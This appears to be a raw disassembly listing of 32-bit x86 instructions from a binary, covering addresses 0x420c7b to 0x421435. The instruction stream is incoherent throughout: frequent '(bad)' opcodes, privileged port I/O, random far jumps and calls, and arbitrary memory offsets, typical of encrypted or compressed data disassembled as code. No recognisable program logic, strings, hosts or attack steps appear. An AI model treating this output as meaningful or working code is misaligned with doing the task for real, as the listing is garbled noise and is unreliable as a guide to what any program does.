  420c7b:	outs   dx,BYTE PTR ds:[esi]
  420c7c:	mov    bh,cl
  420c7e:	stc    
  420c7f:	xchg   esi,eax
  420c80:	dec    edi
  420c81:	shr    DWORD PTR [ebx+ecx*2+0x136efc43],0xfe
  420c89:	jns    0x420c2a
  420c8b:	fdiv   QWORD PTR [esi+0x66]
  420c8e:	jmp    0xd63d:0x72c9466f
  420c95:	std    
  420c96:	add    al,0x67
  420c98:	icebp  
  420c99:	inc    esi
  420c9a:	daa    
  420c9b:	xchg   ebp,eax
  420c9c:	xor    DWORD PTR [edx-0x3130aff0],esi
  420ca2:	sub    edx,DWORD PTR [ecx+ebx*2-0x58fe44cf]
  420ca9:	ror    DWORD PTR [ebx+0x50ab47fd],0x80
  420cb0:	sub    BYTE PTR [edx-0x5feb6e69],0xa4
  420cb7:	call   0x14bb:0x181b2796
  420cbe:	out    0x44,eax
  420cc0:	inc    esi
  420cc1:	or     ah,BYTE PTR [eax]
  420cc3:	push   esp
  420cc4:	mov    al,0x58
  420cc6:	lds    ebp,FWORD PTR [edi+0x697e5838]
  420ccc:	sbb    eax,0x59d6d54a
  420cd1:	mov    esp,0xe51392c4
  420cd6:	pushf  
  420cd7:	in     al,dx
  420cd8:	(bad)  
  420cd9:	cmp    ah,BYTE PTR [edx]
  420cdb:	retf   0x8127
  420cde:	xchg   edi,eax
  420cdf:	fbld   TBYTE PTR [edx+ecx*1+0x13]
  420ce3:	inc    edx
  420ce4:	add    edi,0xffffffbc
  420ce7:	and    DWORD PTR [ebx+edx*2],0xffffffd3
  420ceb:	and    ch,ch
  420ced:	clc    
  420cee:	xchg   esp,eax
  420cef:	sti    
  420cf0:	push   eax
  420cf1:	inc    ebx
  420cf2:	adc    ebp,DWORD PTR [esi]
  420cf4:	div    ch
  420cf6:	xchg   ecx,eax
  420cf7:	int3   
  420cf8:	js     0x420ce2
  420cfa:	dec    ecx
  420cfb:	xlat   BYTE PTR ds:[ebx]
  420cfc:	lea    eax,[ecx+0x2e51c835]
  420d02:	xchg   edx,eax
  420d03:	adc    cl,cl
  420d05:	test   BYTE PTR [esi+0x24],0x56
  420d09:	cmp    ebp,0xd9fa7f2a
  420d0f:	sar    BYTE PTR [esi],0x52
  420d12:	or     BYTE PTR [eax],bh
  420d14:	int3   
  420d15:	in     al,dx
  420d16:	inc    edi
  420d17:	popa   
  420d18:	xor    edi,DWORD PTR [edi+0x59]
  420d1b:	mov    eax,ds:0xac30e95d
  420d20:	xchg   ebp,eax
  420d21:	pop    ebp
  420d22:	pushf  
  420d23:	rol    DWORD PTR [ebx+0x12],1
  420d26:	sub    eax,ecx
  420d28:	mov    ds:0xea2b6f63,eax
  420d2d:	mul    DWORD PTR [ecx-0x6e]
  420d30:	into   
  420d31:	jbe    0x420cb9
  420d33:	mov    esp,0xa82f913e
  420d38:	arpl   bx,bp
  420d3a:	cmp    DWORD PTR [edx],eax
  420d3c:	inc    esp
  420d3d:	and    al,0x66
  420d3f:	jns    0x420d1a
  420d41:	mov    ds:0xef7ccdc5,al
  420d46:	adc    cl,BYTE PTR [edi-0x48]
  420d49:	lods   eax,DWORD PTR ds:[esi]
  420d4a:	or     ah,BYTE PTR [ebx+esi*4+0x7f0bad91]
  420d51:	test   al,0x70
  420d53:	adc    DWORD PTR [edx-0x2d74f9c9],edx
  420d59:	pop    ecx
  420d5a:	jae    0x420d0e
  420d5c:	loopne 0x420d55
  420d5e:	in     al,0xa4
  420d60:	mov    esp,0x59b2f34f
  420d65:	ss xor eax,0xa478e8a0
  420d6b:	or     al,0xa8
  420d6d:	xchg   ebx,eax
  420d6e:	jns    0x420d1e
  420d70:	(bad)  
  420d71:	push   esi
  420d72:	mov    BYTE PTR [ecx],0xe2
  420d75:	and    eax,0xf86dd17c
  420d7a:	mov    dh,BYTE PTR [esi+0x1]
  420d7d:	in     eax,dx
  420d7e:	push   es
  420d7f:	jbe    0x420de7
  420d81:	adc    al,0xe3
  420d83:	sbb    DWORD PTR [ebx],ecx
  420d85:	mov    al,0x6f
  420d87:	sbb    BYTE PTR [esi-0x8],cl
  420d8a:	ins    DWORD PTR es:[edi],dx
  420d8b:	fmul   DWORD PTR [edx-0x40b88c46]
  420d91:	out    dx,eax
  420d92:	dec    edi
  420d93:	ds push ds
  420d95:	xchg   ebx,eax
  420d96:	cmc    
  420d97:	push   esi
  420d98:	sub    BYTE PTR ds:[esi+0x41],bh
  420d9c:	in     al,dx
  420d9d:	xchg   ebx,eax
  420d9e:	and    al,0xef
  420da0:	jnp    0x420d3f
  420da2:	jge    0x420e14
  420da4:	call   0xc8dc:0x830e33a4
  420dab:	inc    edi
  420dac:	es and bh,dh
  420daf:	add    ah,dh
  420db1:	mov    ebx,0x93f0bf88
  420db6:	int3   
  420db7:	cli    
  420db8:	inc    esp
  420db9:	mov    bl,dl
  420dbb:	inc    ebp
  420dbc:	fwait
  420dbd:	ins    DWORD PTR es:[edi],dx
  420dbe:	mov    bl,0x25
  420dc0:	mov    DWORD PTR [eax+eax*1-0x6b2e6dec],ebx
  420dc7:	xor    BYTE PTR [edi],0xe8
  420dca:	popf   
  420dcb:	sbb    cl,dl
  420dcd:	jns    0x420d67
  420dcf:	mov    dh,0xe9
  420dd1:	int    0x4c
  420dd3:	cli    
  420dd4:	jle    0x420d8b
  420dd6:	in     al,dx
  420dd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dd8:	test   al,0x2f
  420dda:	arpl   WORD PTR [edi-0x30],dx
  420ddd:	inc    edx
  420dde:	mov    edi,0x709503a
  420de3:	and    esi,DWORD PTR [edx-0x532a655b]
  420de9:	mov    al,0x3c
  420deb:	outs   dx,DWORD PTR ds:[esi]
  420dec:	add    BYTE PTR [eax],dl
  420dee:	jns    0x420dd1
  420df0:	pop    esp
  420df1:	cmp    al,0xb4
  420df3:	adc    DWORD PTR [esi],ebx
  420df5:	sbb    al,0x5a
  420df7:	pusha  
  420df8:	or     al,0x3e
  420dfa:	stos   BYTE PTR es:[edi],al
  420dfb:	dec    eax
  420dfc:	mov    bh,0xe2
  420dfe:	xchg   DWORD PTR [edi],esp
  420e00:	(bad)  
  420e01:	fdivr  DWORD PTR [ebx+0x8]
  420e04:	fbld   TBYTE PTR [edi+esi*4+0x1e]
  420e08:	aam    0x22
  420e0a:	nop
  420e0b:	inc    esi
  420e0c:	(bad)  
  420e0d:	mov    DWORD PTR [edx],eax
  420e0f:	sar    DWORD PTR [esi],1
  420e11:	sub    DWORD PTR [ebp+0x4ca17794],ecx
  420e17:	mov    esi,0xbac3f964
  420e1c:	addr16 jne 0x420e1e
  420e1f:	inc    edi
  420e20:	adc    DWORD PTR [eax+0xe],eax
  420e23:	fnstcw WORD PTR [edi+0x11736d70]
  420e29:	and    al,0x7c
  420e2b:	ds es gs pushf 
  420e2f:	xlat   BYTE PTR ds:[ebx]
  420e30:	fisttp DWORD PTR [ecx+0x1ed4497e]
  420e36:	fwait
  420e37:	outs   dx,BYTE PTR ds:[esi]
  420e38:	pop    ds
  420e39:	inc    edx
  420e3a:	jl     0x420e8b
  420e3c:	sub    al,0x96
  420e3e:	xchg   ebx,eax
  420e3f:	mov    ecx,0xf706e2ad
  420e44:	ret    
  420e45:	dec    esp
  420e46:	sub    al,0xb7
  420e48:	std    
  420e49:	cmp    DWORD PTR [ebx+0x26],0x8857654e
  420e50:	ins    DWORD PTR es:[edi],dx
  420e51:	jmp    0x3938:0xb25b9e50
  420e58:	sti    
  420e59:	enter  0xfcf6,0xb3
  420e5d:	fst    DWORD PTR [ebp-0x60d7204f]
  420e63:	push   ss
  420e64:	mov    cl,0xcf
  420e66:	pop    ecx
  420e67:	sbb    eax,esp
  420e69:	add    esp,0x408e5ef1
  420e6f:	cmc    
  420e70:	rcl    BYTE PTR [ecx-0x54],cl
  420e73:	ds out 0x58,al
  420e76:	mov    ch,0x31
  420e78:	mov    esp,?
  420e7a:	or     DWORD PTR [edi],ecx
  420e7c:	jmp    0x31fd:0x3d4b6c9b
  420e83:	popa   
  420e84:	push   esp
  420e85:	ret    
  420e86:	lods   eax,DWORD PTR ds:[esi]
  420e87:	mov    dh,0x2c
  420e89:	ins    DWORD PTR es:[edi],dx
  420e8a:	je     0x420e82
  420e8c:	sbb    BYTE PTR [edi],dl
  420e8e:	test   BYTE PTR [edi],ch
  420e90:	outs   dx,BYTE PTR ds:[esi]
  420e91:	mov    esi,0x6ef5fae1
  420e96:	int3   
  420e97:	jg     0x420f0f
  420e99:	outs   dx,DWORD PTR ds:[esi]
  420e9a:	std    
  420e9b:	cmp    eax,0x79a08b19
  420ea0:	lahf   
  420ea1:	(bad)  [edx+0x4ef6554]
  420ea7:	jge    0x420f12
  420ea9:	mov    es,ecx
  420eab:	in     al,dx
  420eac:	xor    ch,bh
  420eae:	push   ds
  420eaf:	pop    eax
  420eb0:	stos   BYTE PTR es:[edi],al
  420eb1:	push   es
  420eb2:	or     edx,DWORD PTR [edx]
  420eb4:	add    DWORD PTR [eax*4-0x2bb7054a],edx
  420ebb:	fidivr WORD PTR [ecx-0x4b66b081]
  420ec1:	fs or  al,0xdf
  420ec4:	les    esi,FWORD PTR [esi-0x50]
  420ec7:	verr   WORD PTR [ebx]
  420eca:	mov    edi,0x791b552a
  420ecf:	ret    
  420ed0:	sub    DWORD PTR ds:0x4cd3a2da,ebx
  420ed6:	push   edx
  420ed7:	ret    
  420ed8:	push   cs
  420ed9:	clc    
  420eda:	in     eax,dx
  420edb:	inc    ebp
  420edc:	adc    eax,0x5f9a2ad6
  420ee1:	aam    0x44
  420ee3:	xor    eax,0x4fb337f2
  420ee8:	inc    esp
  420ee9:	in     eax,0xa5
  420eeb:	(bad)  
  420eec:	mov    ecx,0x2b5df78e
  420ef1:	xchg   ecx,eax
  420ef2:	js     0x420f72
  420ef4:	sub    BYTE PTR [esi-0x28948533],cl
  420efa:	add    BYTE PTR [ecx+0x3cd5265a],bh
  420f00:	lods   al,BYTE PTR ds:[esi]
  420f01:	xchg   esi,ebp
  420f03:	push   cs
  420f04:	sti    
  420f05:	or     ebx,DWORD PTR [edx-0x3cee5898]
  420f0b:	mov    dh,0xb1
  420f0d:	jmp    FWORD PTR [edx+0xf]
  420f10:	aam    0xb6
  420f12:	js     0x420ed1
  420f14:	out    dx,al
  420f15:	mov    ds:0xf716cf6a,eax
  420f1a:	dec    edi
  420f1b:	xor    ebp,ebp
  420f1d:	das    
  420f1e:	mov    eax,ds:0x75a60d1d
  420f23:	xchg   edi,eax
  420f24:	hlt    
  420f25:	inc    esi
  420f26:	sub    DWORD PTR [edi-0x18],0x46
  420f2a:	or     ah,bh
  420f2c:	add    BYTE PTR [edi+esi*1+0x28],dh
  420f30:	add    al,0x64
  420f32:	inc    ecx
  420f33:	call   0x3e16efda
  420f38:	cmp    ebx,0x96eb8bc
  420f3e:	push   DWORD PTR [ecx]
  420f40:	fdivr  QWORD PTR [ecx+0x4e92b985]
  420f46:	jle    0x420f9e
  420f48:	ret    0x1c7
  420f4b:	mov    WORD PTR [edx+edx*1],es
  420f4e:	pusha  
  420f4f:	inc    ebx
  420f50:	push   esp
  420f51:	and    esp,DWORD PTR [ecx-0x420c2e25]
  420f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f58:	mov    dh,0x27
  420f5a:	cmp    edx,DWORD PTR [ebx+edi*8+0x1dce32bc]
  420f61:	pop    es
  420f62:	popf   
  420f63:	outs   dx,DWORD PTR ds:[esi]
  420f64:	pop    DWORD PTR [eax+0x3ee47043]
  420f6a:	dec    eax
  420f6b:	jl     0x420f8c
  420f6d:	loope  0x420f19
  420f6f:	push   edx
  420f70:	xchg   esp,eax
  420f71:	mov    ah,0x7d
  420f73:	sbb    eax,0x708b85d1
  420f78:	and    ebx,DWORD PTR [edi-0x1983e717]
  420f7e:	fst    DWORD PTR [eax+0x10]
  420f81:	div    DWORD PTR [ecx+0x1b]
  420f84:	xchg   esi,eax
  420f85:	pop    edx
  420f86:	dec    ebp
  420f87:	adc    DWORD PTR [eax+0x6a],edi
  420f8a:	sbb    DWORD PTR [edx],esi
  420f8c:	stc    
  420f8d:	pusha  
  420f8e:	call   0x9c27:0x22807e12
  420f95:	xchg   edx,eax
  420f96:	shl    ah,0x65
  420f99:	xor    bh,BYTE PTR [ecx-0x55ea5810]
  420f9f:	mov    ebp,gs
  420fa1:	retf   0x7890
  420fa4:	inc    BYTE PTR [ebx-0xe34b2b4]
  420faa:	test   al,0x34
  420fac:	lods   al,BYTE PTR ds:[esi]
  420fad:	jb     0x421009
  420faf:	mov    BYTE PTR [ebx+0x1a],bh
  420fb2:	sbb    eax,0x2d3cdfee
  420fb7:	adc    eax,ebx
  420fb9:	test   eax,0x2b85a882
  420fbe:	push   es
  420fbf:	jmp    0x1716:0xf93c1f8a
  420fc6:	pop    edx
  420fc7:	scas   al,BYTE PTR es:[edi]
  420fc8:	int3   
  420fc9:	jge    0x420f8d
  420fcb:	lods   al,BYTE PTR ds:[esi]
  420fcc:	fcom   DWORD PTR [ebp+0x41]
  420fcf:	gs sbb ah,al
  420fd2:	loope  0x421002
  420fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd5:	pop    DWORD PTR [esi-0x73]
  420fd8:	push   esi
  420fd9:	mov    bh,0x24
  420fdb:	ds loope 0x420fa7
  420fde:	ss inc eax
  420fe0:	lea    esp,[esi-0x7d]
  420fe3:	scas   eax,DWORD PTR es:[edi]
  420fe4:	test   eax,0x56e63307
  420fe9:	mov    bl,0x7d
  420feb:	cmp    ecx,esi
  420fed:	sub    DWORD PTR fs:[esi+0x4e],0x22f860bc
  420ff5:	les    esp,FWORD PTR [edi]
  420ff7:	pushf  
  420ff8:	cdq    
  420ff9:	cwde   
  420ffa:	jge    0x420fcc
  420ffc:	push   eax
  420ffd:	push   ecx
  420ffe:	mov    al,ds:0xd53aed99
  421003:	std    
  421004:	jl     0x421022
  421006:	sbb    edx,edx
  421008:	push   cs
  421009:	jne    0x420fef
  42100b:	je     0x42105d
  42100d:	stc    
  42100e:	int    0x31
  421010:	xor    BYTE PTR [ebp-0x2652226f],dh
  421016:	sub    DWORD PTR [ebp+0x52461bc3],eax
  42101c:	jmp    0x6bd4059f
  421021:	inc    esp
  421022:	inc    ebp
  421023:	in     al,dx
  421024:	arpl   WORD PTR [edi],di
  421026:	(bad)  
  421027:	loopne 0x421004
  421029:	mov    al,ds:0x3bbf8ffb
  42102e:	pop    ecx
  42102f:	xor    edx,DWORD PTR [edx-0x3e]
  421032:	xchg   edi,eax
  421033:	mov    DWORD PTR [ecx],ecx
  421035:	(bad)  
  421036:	or     BYTE PTR [edi],bh
  421038:	pop    edx
  421039:	loopne 0x421069
  42103b:	sbb    cl,BYTE PTR [edx]
  42103d:	shl    ebx,0x3f
  421040:	pop    ebx
  421041:	jne    0x42100b
  421043:	push   ebx
  421044:	sub    DWORD PTR [ebx-0x8],0x9
  421048:	rsqrtps xmm5,XMMWORD PTR [ecx]
  42104b:	scas   al,BYTE PTR es:[edi]
  42104c:	jle    0x421039
  42104e:	xchg   edx,eax
  42104f:	stos   BYTE PTR es:[edi],al
  421050:	hlt    
  421051:	ds call 0x752ec1ee
  421057:	sub    al,0xae
  421059:	xor    DWORD PTR [ecx],esp
  42105b:	lods   eax,DWORD PTR ds:[esi]
  42105c:	fnstenv [eax+0x4f17879e]
  421062:	pop    ss
  421063:	mov    cl,0xb8
  421065:	and    al,0x7a
  421067:	lahf   
  421068:	fs aam 0x5d
  42106b:	shr    BYTE PTR [edi+0x3d],cl
  42106e:	fcomp  DWORD PTR [edi-0x5ea9656e]
  421074:	in     eax,dx
  421075:	pop    es
  421076:	jno    0x4210a7
  421078:	ror    DWORD PTR [ebx-0x1ac07a9c],cl
  42107e:	test   ecx,ebp
  421080:	shl    DWORD PTR [eiz*2+0x3c1d9aba],cl
  421087:	rol    ah,cl
  421089:	jmp    0xc45023eb
  42108e:	mov    bh,0x92
  421090:	adc    al,0xb6
  421092:	call   0x1fbac6b4
  421097:	mov    dl,0xc
  421099:	inc    ebx
  42109a:	jmp    0x421045
  42109c:	cli    
  42109d:	mov    dl,BYTE PTR [edx+0x2]
  4210a0:	push   ds
  4210a1:	fwait
  4210a2:	(bad)  
  4210a3:	xchg   edi,eax
  4210a4:	adc    edx,DWORD PTR [edi-0x3f]
  4210a7:	dec    ebp
  4210a8:	lods   al,BYTE PTR ds:[esi]
  4210a9:	gs popa 
  4210ab:	push   0x4f
  4210ad:	pop    eax
  4210ae:	and    edx,ebp
  4210b0:	loopne 0x4210d9
  4210b2:	hlt    
  4210b3:	sub    eax,0xb68b5a62
  4210b8:	mov    edx,DWORD PTR [edx]
  4210ba:	jbe    0x4210c2
  4210bc:	xor    BYTE PTR [ecx+0x1f],bh
  4210bf:	push   ss
  4210c0:	gs xchg ecx,eax
  4210c2:	pop    esi
  4210c3:	cmp    DWORD PTR [ebp+0x31],0x231ca028
  4210ca:	pop    esi
  4210cb:	and    eax,0xbad590e3
  4210d0:	loope  0x42106a
  4210d2:	js     0x4210e8
  4210d4:	ret    0x1863
  4210d7:	mov    ebp,0x4894ea7e
  4210dc:	fnstenv [ebx]
  4210de:	jno    0x4210f8
  4210e0:	mov    ecx,0x3071953
  4210e5:	retf   0x4275
  4210e8:	mov    ds:0x6994500d,eax
  4210ed:	push   es
  4210ee:	dec    ebp
  4210ef:	xor    al,BYTE PTR [esi]
  4210f1:	ins    DWORD PTR es:[edi],dx
  4210f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210f3:	stc    
  4210f4:	imul   edx,ecx,0xa623d1c5
  4210fa:	rcr    DWORD PTR [ebp-0x6],0x8e
  4210fe:	cmp    cl,BYTE PTR [edx-0x1f97330]
  421104:	sub    edi,DWORD PTR [ebx-0x523a009e]
  42110a:	pushf  
  42110b:	and    esi,DWORD PTR ds:[edx-0x5b8dedaa]
  421112:	scas   al,BYTE PTR es:[edi]
  421113:	popf   
  421114:	push   es
  421115:	pop    es
  421116:	dec    ecx
  421117:	cmp    dl,BYTE PTR [edi-0x660044ae]
  42111d:	xchg   edi,eax
  42111e:	mov    esp,0x1ece9eab
  421123:	cdq    
  421124:	fnstcw WORD PTR [ebp+0xfba74c1]
  42112a:	pop    es
  42112b:	add    bh,BYTE PTR ds:0x15ed02cf
  421131:	cmp    dl,BYTE PTR [edi-0x36]
  421134:	(bad)  
  421136:	out    dx,al
  421137:	test   eax,0x187422a2
  42113c:	fdiv   DWORD PTR [eax+0x1a]
  42113f:	push   ds
  421140:	std    
  421141:	in     eax,0x6a
  421143:	(bad)  
  421144:	out    0xba,eax
  421146:	inc    esp
  421147:	jmp    0x7b7f7e79
  42114c:	icebp  
  42114d:	adc    BYTE PTR ds:0x614740ba,bl
  421153:	rcl    BYTE PTR [ecx],cl
  421155:	repz and edi,DWORD PTR [edx]
  421158:	fwait
  421159:	hlt    
  42115a:	add    BYTE PTR gs:[edi+0x7ed92672],0x7e
  421162:	or     ebp,ecx
  421164:	dec    esp
  421165:	cs ret 
  421167:	pushf  
  421168:	xor    eax,esi
  42116a:	jle    0x4211aa
  42116c:	push   es
  42116d:	outs   dx,BYTE PTR ds:[esi]
  42116e:	in     al,dx
  42116f:	xchg   esi,eax
  421170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421171:	mov    bl,0x7f
  421173:	sub    cl,BYTE PTR [ecx+0x6c58cf2]
  421179:	arpl   si,bx
  42117b:	aad    0xf4
  42117d:	xor    eax,0x9435d7eb
  421182:	cmp    eax,0x337d3cae
  421187:	mov    DWORD PTR [esi+0x7b8f905e],edx
  42118d:	es inc ecx
  42118f:	ss stc 
  421191:	jge    0x4211d0
  421193:	sbb    DWORD PTR [ebx],ebp
  421195:	jg     0x421132
  421197:	cwde   
  421198:	push   edx
  421199:	mov    al,ds:0x54f0459d
  42119e:	push   ds
  42119f:	int3   
  4211a0:	push   ebp
  4211a1:	in     al,dx
  4211a2:	and    esi,DWORD PTR [esi-0x62]
  4211a5:	enter  0x9dd6,0xe
  4211a9:	jo     0x42120f
  4211ab:	pop    eax
  4211ac:	dec    eax
  4211ad:	mov    bl,0x24
  4211af:	mov    cl,0x89
  4211b1:	aad    0xa0
  4211b3:	fisubr WORD PTR [eax+0x541a4958]
  4211b9:	icebp  
  4211ba:	repnz push ds
  4211bc:	(bad)  
  4211bd:	fldcw  WORD PTR [eax-0x4ca9b454]
  4211c3:	inc    esi
  4211c4:	and    eax,0x6e8cb729
  4211c9:	dec    eax
  4211ca:	cwde   
  4211cb:	cli    
  4211cc:	or     edi,DWORD PTR [esi+edi*8+0x17b0f306]
  4211d3:	enter  0x8782,0x10
  4211d7:	(bad)  
  4211d8:	xchg   DWORD PTR [ebx+0x12d60d84],esp
  4211de:	sbb    eax,ecx
  4211e0:	outs   dx,DWORD PTR ds:[esi]
  4211e1:	aas    
  4211e2:	adc    ah,BYTE PTR [ebp+0x18c11579]
  4211e8:	mov    al,ds:0x5ddf441
  4211ed:	push   cs
  4211ee:	xchg   esi,eax
  4211ef:	(bad)  
  4211f1:	shl    DWORD PTR [edx],1
  4211f3:	scas   eax,DWORD PTR es:[edi]
  4211f4:	push   es
  4211f5:	sub    eax,0x368b9482
  4211fa:	mov    bh,0xf4
  4211fc:	jne    0x4211f5
  4211fe:	mov    edi,0xefde3e5b
  421203:	cdq    
  421204:	pop    eax
  421205:	jno    0x42127b
  421207:	lods   eax,DWORD PTR ds:[esi]
  421208:	jp     0x42124e
  42120a:	mov    ah,ch
  42120c:	push   0x2cf577d5
  421211:	xchg   BYTE PTR [esi],bh
  421213:	pop    DWORD PTR [edi]
  421215:	sbb    dh,BYTE PTR [esi-0x32fdb4d6]
  42121b:	jmp    0xea7aad1d
  421220:	dec    esi
  421222:	les    ebx,FWORD PTR [ebp+0x7ee8e831]
  421228:	dec    edx
  421229:	ss push ebp
  42122b:	adc    al,0x42
  42122d:	lods   eax,DWORD PTR ds:[esi]
  42122e:	mov    esi,0x7ec1761c
  421233:	mov    ah,0x9e
  421235:	aam    0xb0
  421237:	aam    0xb4
  421239:	aam    0x53
  42123b:	jle    0x4211f7
  42123d:	add    eax,DWORD PTR [ebp-0x62]
  421240:	xchg   ecx,eax
  421241:	jl     0x4212af
  421243:	retf   
  421244:	mov    ecx,DWORD PTR [edx]
  421246:	push   eax
  421247:	add    edx,DWORD PTR [edi+eiz*8-0x1]
  42124b:	lds    ecx,FWORD PTR [esi+ebx*4+0x49]
  42124f:	fs cdq 
  421251:	(bad)  
  421252:	cld    
  421253:	cmp    al,BYTE PTR [eax]
  421255:	adc    DWORD PTR [esp+esi*2-0x1e],esi
  421259:	sbb    BYTE PTR [ebx],ch
  42125b:	cmp    bl,bh
  42125d:	pop    esi
  42125e:	ret    
  42125f:	fimul  WORD PTR [eax+0x4d72e4e]
  421265:	mov    al,ss:0xac71df6d
  42126b:	and    ah,dh
  42126d:	mov    al,BYTE PTR [edx+0x3b565a8b]
  421273:	and    al,BYTE PTR [edx+0x30734ce1]
  421279:	jmp    0x42127d
  42127b:	mov    cl,0xd
  42127d:	or     eax,0xc6b6fe23
  421282:	jmp    FWORD PTR [eax-0x5e]
  421285:	fistp  DWORD PTR [edx+ebp*2]
  421288:	ds inc esp
  42128a:	sbb    BYTE PTR [ebx-0x26],cl
  42128d:	dec    esp
  42128e:	or     ebp,DWORD PTR [esi+0x26ab43f0]
  421294:	test   al,0x51
  421296:	lods   al,BYTE PTR ds:[esi]
  421297:	ds ds mov dh,0xd4
  42129b:	mov    eax,ds:0x8826dc3b
  4212a0:	out    dx,eax
  4212a1:	fiadd  WORD PTR [ecx]
  4212a3:	mov    ah,0xfa
  4212a5:	pop    ss
  4212a6:	idiv   DWORD PTR [ebp+eax*8-0x57]
  4212aa:	cs jne 0x4212bf
  4212ad:	inc    edi
  4212ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212af:	hlt    
  4212b0:	mov    bl,0xd9
  4212b2:	lea    edx,[eax-0x6b]
  4212b5:	stos   DWORD PTR es:[edi],eax
  4212b6:	psubq  mm1,QWORD PTR [edi+ebx*2+0x2b]
  4212bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212bc:	dec    edx
  4212bd:	fmul   DWORD PTR [esi-0x3c1e7b6c]
  4212c3:	clc    
  4212c4:	mov    ch,0xce
  4212c6:	sti    
  4212c7:	test   DWORD PTR [ecx+0x77f30167],0x21325847
  4212d1:	cdq    
  4212d2:	stos   DWORD PTR es:[edi],eax
  4212d3:	dec    esi
  4212d4:	sahf   
  4212d5:	inc    edx
  4212d6:	in     al,dx
  4212d7:	ret    
  4212d8:	push   0x4b
  4212da:	sub    eax,0x24950be5
  4212df:	shl    DWORD PTR ds:0xdef34ae5,1
  4212e5:	(bad)
  4212e8:	out    dx,eax
  4212e9:	mov    esi,0x87c187a2
  4212ee:	sub    al,0x64
  4212f0:	mov    bl,dh
  4212f2:	sub    DWORD PTR [esp+eax*8],edi
  4212f5:	loopne 0x4212b7
  4212f7:	xchg   ebp,eax
  4212f8:	dec    esi
  4212f9:	inc    eax
  4212fa:	imul   BYTE PTR [esi+0x29]
  4212fd:	sbb    edx,0x773d36ad
  421303:	or     ebx,DWORD PTR [edx]
  421305:	fwait
  421306:	xor    al,0xc5
  421308:	cli    
  421309:	inc    edi
  42130a:	stos   DWORD PTR es:[edi],eax
  42130b:	mov    al,ds:0xf82bb56d
  421310:	adc    dl,BYTE PTR [ecx+0x66bc0863]
  421316:	mov    ds:0xe7941b50,al
  42131b:	leave  
  42131c:	out    0x68,al
  42131e:	mov    dh,0xa2
  421320:	adc    ebp,ebp
  421322:	pop    ecx
  421323:	cwde   
  421324:	push   DWORD PTR [ebp+esi*1-0x3b11d3e1]
  42132b:	(bad)  [edx-0x3b]
  42132e:	fld    TBYTE PTR [esi+0x5a]
  421331:	mov    ebp,0x89a2715
  421336:	xor    eax,0x5650051e
  42133b:	imul   eax,DWORD PTR [edx-0xe],0x6aa285ef
  421342:	xchg   ebx,eax
  421343:	pop    eax
  421344:	add    esp,esi
  421346:	xchg   ecx,eax
  421347:	pusha  
  421348:	(bad)  
  42134a:	ss (bad) 
  42134c:	in     al,0xd1
  42134e:	js     0x4212ed
  421350:	push   cs
  421351:	cs xchg ebp,ebx
  421354:	(bad)  [ebx-0x669db87]
  42135a:	push   ss
  42135b:	adc    ecx,ebp
  42135d:	inc    ebp
  42135e:	or     BYTE PTR [ebx+edx*8+0x16],0xd5
  421363:	push   0xfe224f6d
  421368:	add    ch,al
  42136a:	pusha  
  42136b:	in     eax,0x7d
  42136d:	inc    ebx
  42136e:	adc    DWORD PTR [eax-0x6d771081],esi
  421374:	inc    esp
  421375:	ret    
  421376:	cwde   
  421377:	pop    ecx
  421379:	add    al,0x5b
  42137b:	repz adc bh,0x5a
  42137f:	mov    ah,0x3e
  421381:	les    esp,FWORD PTR [edi+0x6757d51f]
  421387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421388:	pop    DWORD PTR [edx+0x6a81746b]
  42138e:	das    
  42138f:	jge    0x4213d9
  421391:	xchg   BYTE PTR [esi+0x3d],bh
  421394:	js     0x42139f
  421396:	dec    ebx
  421397:	lods   eax,DWORD PTR ds:[esi]
  421398:	jno    0x42134c
  42139a:	jl     0x421347
  42139c:	pop    esp
  42139d:	add    eax,0x8cb2d5da
  4213a2:	data16 xor ch,BYTE PTR es:[edi-0x83e9064]
  4213aa:	bound  eax,QWORD PTR [ebp-0x44]
  4213ad:	and    BYTE PTR [ebp+0x52],0xde
  4213b1:	pop    edi
  4213b2:	sbb    al,0x47
  4213b4:	pop    ss
  4213b5:	lods   al,BYTE PTR ds:[esi]
  4213b6:	and    ebp,DWORD PTR [eax-0xfc3db2b]
  4213bc:	jge    0x421394
  4213be:	(bad)  
  4213bf:	in     al,dx
  4213c0:	scas   al,BYTE PTR es:[edi]
  4213c1:	ror    dh,0xd1
  4213c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213c5:	xor    esp,DWORD PTR [edi+0x7a]
  4213c8:	inc    edi
  4213c9:	aam    0xdc
  4213cb:	enter  0x6da3,0x34
  4213cf:	mov    bh,0x6b
  4213d1:	fcom   QWORD PTR [ebp+0x5280a07f]
  4213d7:	pop    edi
  4213d8:	cwde   
  4213d9:	daa    
  4213da:	cs push 0xffffffe4
  4213dd:	push   edx
  4213de:	rcr    BYTE PTR [esi-0x11f7128],1
  4213e4:	mov    BYTE PTR [edx],bl
  4213e6:	mov    ebx,0xfce7baf4
  4213eb:	adc    ecx,edx
  4213ed:	mov    dl,0x6a
  4213ef:	cli    
  4213f0:	adc    DWORD PTR [eax-0x39],esi
  4213f3:	aad    0xe2
  4213f5:	test   BYTE PTR [ecx+0x55],cl
  4213f8:	aad    0xc6
  4213fa:	test   eax,0xdd21ccdb
  4213ff:	push   0xa413960a
  421404:	jne    0x4213fd
  421406:	mov    cl,0x39
  421408:	jo     0x421396
  42140a:	and    edi,DWORD PTR [esi+0x58]
  42140d:	mov    dh,0x15
  42140f:	js     0x42141f
  421411:	rcr    DWORD PTR [edi-0x32],1
  421414:	pop    edx
  421415:	cli    
  421416:	lods   al,BYTE PTR ds:[esi]
  421417:	cmp    esp,ebp
  421419:	mov    al,ch
  42141b:	sub    BYTE PTR [ebx],ch
  42141d:	ficom  DWORD PTR [ebp-0x7a9c9a85]
  421423:	xchg   ebp,eax
  421424:	add    DWORD PTR [edx+ebx*2],esi
  421427:	aam    0xb0
  421429:	int    0x72
  42142b:	adc    eax,0x8c857bec
  421430:	cmp    DWORD PTR [ecx],eax
  421432:	int3   
  421433:	aas    
  421434:	inc    esp
  421435:	lea    edi,ds:0x7faf1bd3
